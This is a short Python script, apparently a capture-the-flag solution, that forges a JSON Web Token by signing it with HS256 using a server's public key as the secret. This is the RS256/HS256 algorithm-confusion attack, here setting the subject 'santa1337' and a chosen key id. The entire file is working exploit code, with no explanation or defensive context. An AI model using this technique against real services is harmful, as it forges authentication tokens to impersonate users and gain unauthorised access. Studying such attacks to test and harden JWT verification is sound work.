#!/usr/bin/env python3
import jwt

public = open('public_key.pem', 'r').read()
token = jwt.encode({
    "exp": 1608318097,
    "iat": 1608214497,
    "sub": "santa1337"
    }, key=public, algorithm='HS256', headers={'kid': '/keys/1d21a9f945'}).decode('ascii')

print(token)
